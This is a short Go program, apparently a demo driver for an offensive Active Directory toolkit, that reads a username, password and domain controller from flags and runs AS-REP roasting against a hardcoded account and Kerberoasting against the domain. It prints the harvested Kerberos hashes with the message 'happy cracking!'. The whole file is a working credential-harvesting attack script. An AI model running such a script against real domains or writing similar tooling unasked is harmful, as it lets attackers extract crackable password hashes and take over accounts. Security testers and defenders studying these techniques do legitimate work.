package main

import (
	"fmt"
	"os"

	"github.com/5amu/goad/internal/attacks"
	"github.com/projectdiscovery/goflags"
)

var (
	user       string
	pass       string
	domain     string
	controller string
	port       int
	ssl        bool
	skipTLS    bool
)

func cliparse() error {
	flagSet := goflags.NewFlagSet()

	flagSet.StringVarP(&user, "user", "u", "", "provide username")
	flagSet.StringVarP(&pass, "pass", "p", "", "provide password")
	flagSet.StringVarP(&domain, "domain", "d", "WORKGROUP", "provide domain")
	flagSet.StringVarP(&controller, "domaincontroller", "dc", "", "provide domain controller IP/FQDN")
	flagSet.IntVarP(&port, "port", "P", 389, "ldap port to contact")
	flagSet.BoolVarP(&ssl, "ssl", "s", false, "use ssl to interact with ldap")
	flagSet.BoolVarP(&skipTLS, "skiptls", "st", true, "should ldap upgrade the ldap connection")

	return flagSet.Parse()
}

func main() {

	cliparse()

	asreps, err := attacks.AsRepRoast(&attacks.AsRepRoastOpts{
		Users:            []string{"asreeep"},
		Realm:            domain,
		DomainController: controller,
	})
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	for _, a := range asreps {
		fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", domain, a.User, a.Hash)
	}

	results, err := attacks.Kerberoast(&attacks.KerberoastOpts{
		User:             user,
		Realm:            domain,
		Password:         pass,
		DomainController: controller,
		LdapPort:         port,
		LdapSSL:          ssl,
		LdapSkipTLS:      true,
	})
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	for _, entry := range results {
		fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", domain, user, entry.ServicePrincipalName, entry.Hash)
	}
}
